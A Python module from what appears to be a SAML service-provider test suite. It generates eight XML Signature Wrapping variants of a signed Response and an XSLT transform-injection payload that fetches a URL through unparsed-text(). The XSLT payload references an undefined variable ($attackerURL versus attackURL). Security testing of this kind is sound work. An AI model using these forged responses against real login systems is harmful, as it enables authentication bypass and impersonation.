from lxml import etree
from spid_sp_test.utils import del_ns

from ..constants import OASIS_DEFAULT_NS_PREFIXES
from ..response import saml_rnd_id


def xsw1(xml, conf):
    tree = etree.fromstring(xml)
    del_ns(tree)

    _sign = tree.xpath("Signature")[0]
    signature = etree.tostring(_sign).decode()
    _res = tree.xpath("/Response")[0]
    _res.remove(_sign)

    response = etree.tostring(_res).decode()
    signature = signature.replace("</Signature>", f"{response}</Signature>")

    sign_elem = etree.XML(signature)
    _res.insert(1, sign_elem)

    _as_sign = _res.xpath("Assertion")[0].xpath("Signature")[0]
    _res.xpath("Assertion")[0].remove(_as_sign)
    _res.attrib["ID"] = saml_rnd_id()

    xml = etree.tostring(_res).decode()
    return xml


def xsw2(xml, conf):
    tree = etree.fromstring(xml)
    del_ns(tree)

    _sign = tree.xpath("Signature")[0]
    _res = tree.xpath("/Response")[0]
    _res.remove(_sign)

    new_res = etree.XML(etree.tostring(_res).decode())
    tree.insert(2, new_res)
    tree.insert(3, _sign)

    evil_assertion = _res.xpath("Assertion")[0]
    evil_assertion.attrib["ID"] = saml_rnd_id()
    _as_sign = evil_assertion.xpath("Signature")[0]
    evil_assertion.remove(_as_sign)

    tree.attrib["ID"] = saml_rnd_id()
    xml = etree.tostring(tree).decode()

    return xml


def xsw3(xml, conf):
    tree = etree.fromstring(xml)
    del_ns(tree)

    _sign = tree.xpath("Signature")[0]
    _res = tree.xpath("/Response")[0]
    _res.remove(_sign)

    _ass = _res.xpath("Assertion")[0]

    new_ass = etree.XML(etree.tostring(_ass).decode())
    _ass_sign = new_ass.xpath("Signature")[0]
    new_ass.remove(_ass_sign)
    new_ass.attrib["ID"] = saml_rnd_id()
    tree.insert(2, new_ass)

    xml = etree.tostring(tree).decode()
    return xml


def xsw4(xml, conf):
    tree = etree.fromstring(xml)
    del_ns(tree)

    _sign = tree.xpath("Signature")[0]
    _res = tree.xpath("/Response")[0]
    _res.remove(_sign)

    _ass = _res.xpath("Assertion")[0]
    _res.remove(_ass)

    new_ass = etree.XML(etree.tostring(_ass).decode())
    _ass_sign = new_ass.xpath("Signature")[0]
    new_ass.remove(_ass_sign)
    new_ass.attrib["ID"] = saml_rnd_id()
    new_ass.append(_ass)

    _res.append(new_ass)
    xml = etree.tostring(_res).decode()
    return xml


def xsw5(xml, conf):
    tree = etree.fromstring(xml)
    del_ns(tree)

    _sign = tree.xpath("Signature")[0]
    _res = tree.xpath("/Response")[0]
    _res.remove(_sign)

    _ass = _res.xpath("Assertion")[0]
    tree.remove(_ass)
    new_ass = etree.XML(etree.tostring(_ass).decode())
    _ass_sign = new_ass.xpath("Signature")[0]
    new_ass.remove(_ass_sign)

    _ass.attrib["ID"] = saml_rnd_id()
    tree.insert(3, new_ass)
    tree.insert(2, _ass)

    xml = etree.tostring(tree).decode()
    return xml


def xsw6(xml, conf):
    tree = etree.fromstring(xml)
    del_ns(tree)

    _sign = tree.xpath("Signature")[0]
    _res = tree.xpath("/Response")[0]
    _res.remove(_sign)

    _ass = _res.xpath("Assertion")[0]
    tree.remove(_ass)
    new_ass = etree.XML(etree.tostring(_ass).decode())
    _ass_sign = new_ass.xpath("Signature")[0]
    new_ass.remove(_ass_sign)

    _ass.attrib["ID"] = saml_rnd_id()
    _ass.xpath("Signature")[0].append(new_ass)
    tree.insert(2, _ass)

    xml = etree.tostring(tree).decode()
    return xml


def xsw7(xml, conf):
    tree = etree.fromstring(xml)
    del_ns(tree)

    _sign = tree.xpath("Signature")[0]
    _res = tree.xpath("/Response")[0]
    _res.remove(_sign)

    _ass = _res.xpath("Assertion")[0]

    new_ass = etree.XML(etree.tostring(_ass).decode())
    _ass_sign = new_ass.xpath("Signature")[0]
    new_ass.remove(_ass_sign)

    ext = etree.XML("<Extensions />")
    ext.insert(0, new_ass)
    tree.insert(1, ext)

    xml = etree.tostring(tree).decode()
    return xml


def xsw8(xml, conf):
    tree = etree.fromstring(xml)
    del_ns(tree)

    _sign = tree.xpath("Signature")[0]
    _res = tree.xpath("/Response")[0]
    _res.remove(_sign)

    _ass = _res.xpath("Assertion")[0]
    new_ass = etree.XML(etree.tostring(_ass).decode())
    _ass_sign = _ass.xpath("Signature")[0]
    new_ass.remove(new_ass.xpath("Signature")[0])

    obj = etree.XML("<Object />")
    obj.insert(0, new_ass)
    _ass_sign.append(etree.XML(etree.tostring(obj).decode()))
    xml = etree.tostring(tree).decode()
    return xml


def xslt(xml, conf):
    tree = etree.fromstring(xml)
    trans = tree.xpath(
        "ds:Signature/ds:SignedInfo/ds:Reference/ds:Transforms",
        namespaces=OASIS_DEFAULT_NS_PREFIXES,
    )

    payload = """<ds:Transform xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                     <xsl:template match="doc">
                        <xsl:variable name="file" select="'test'" />
                        <xsl:variable name="escaped" select="encode-for-uri('$file')" />
                        <xsl:variable name="attackURL" select="'http://localhost:19000/#!/auth'" />
                        <xsl:variable name="exploitURL" select="concat($attackerURL,$escaped)" />
                        <xsl:value-of select="unparsed-text($exploitURL)" />
                     </xsl:template>
                  </xsl:stylesheet>
               </ds:Transform>"""
    _p = etree.XML(payload)
    trans[0].insert(0, _p)
    xml = etree.tostring(tree).decode()
    return xml
